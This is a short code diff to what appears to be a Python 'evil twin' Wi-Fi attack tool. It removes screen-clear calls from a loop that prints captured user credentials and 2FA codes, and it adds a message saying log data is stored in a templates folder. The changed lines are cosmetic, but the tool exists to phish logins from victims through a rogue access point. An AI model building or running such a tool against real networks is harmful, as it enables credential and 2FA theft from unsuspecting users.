@@ -253,7 +253,6 @@ def getCredentials():
     while True:
         current_user, current_2fa = read_file()
         if initial_user != current_user:
-            os.system("clear")
             print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
             print(Fore.WHITE)
             for line in current_user:
@@ -264,7 +263,6 @@ def getCredentials():
             initial_user = current_user
 
         if initial_2fa != current_2fa:
-            os.system("clear")
             print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
             print(Fore.WHITE)
             for line in current_2fa:
@@ -520,6 +518,7 @@ def attack_func(network_interface, attack_mode):
             if b'xterm' in line:
                 pid = int(line.split(None, 1)[0])
                 os.kill(pid, signal.SIGKILL)
+        print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + ' Log data is save inside (ETwin-Templates) folder.'}")
         print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + ' Deleting temporary files..'}")
         os.system('rm -rf wifi_hostapd.conf wifi_dnsmasq.conf')
         get_colours("\n\n[*] Attack completed successfully", 'green')
